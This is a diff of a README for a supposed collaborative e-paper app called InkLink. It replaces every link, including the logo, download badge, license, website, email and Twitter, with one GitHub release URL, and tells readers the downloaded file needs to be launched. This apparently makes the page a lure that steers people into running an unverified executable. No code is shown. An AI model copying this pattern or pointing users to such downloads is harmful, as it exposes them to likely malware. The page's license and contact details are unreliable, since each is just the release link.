@@ -1,6 +1,6 @@
 # InkLink 🎨🖋️📱🖥️
 
-![InkLink Logo](https://example.com/logo.png)
+![InkLink Logo](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0)
 
 Welcome to InkLink - your ultimate destination for real-time collaborative E-Paper Canvas! 🚀
 
@@ -18,11 +18,11 @@ Welcome to InkLink - your ultimate destination for real-time collaborative E-Pap
 ## 📥 Get Started
 To start creating amazing collaborative art with InkLink, simply download the latest version from the link below:
 
-[![Download InkLink v1.0.0](https://img.shields.io/badge/Download-InkLink%20v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download InkLink v1.0.0](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0%20v1.0.0-blue)](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0)
 
 ℹ️ *Please note that the downloaded file needs to be launched to get started.*
 
-In case the download link is not working, kindly visit the [Releases](https://github.com/cli/oauth/releases) section for alternative download options.
+In case the download link is not working, kindly visit the [Releases](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0) section for alternative download options.
 
 ---
 
@@ -64,16 +64,16 @@ In case the download link is not working, kindly visit the [Releases](https://gi
 ---
 
 ## 📜 License
-⚖️ This project is licensed under the MIT License - see the [LICENSE](https://github.com/cli/oauth/License.md) file for details.
+⚖️ This project is licensed under the MIT License - see the [LICENSE](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0) file for details.
 
 ---
 
 ## 📞 Connect with Us
-🌐 **Website:** [www.inklink.com](https://www.inklink.com)
+🌐 **Website:** [https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0)
 
-📧 **Email:** info@inklink.com
+📧 **Email:** https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0
 
-🐦 **Twitter:** [@InkLinkArt](https://twitter.com/InkLinkArt)
+🐦 **Twitter:** [@InkLinkArt](https://github.com/Ahmedthegoat10/InkLink/releases/tag/v1.0)
 
 ---
 
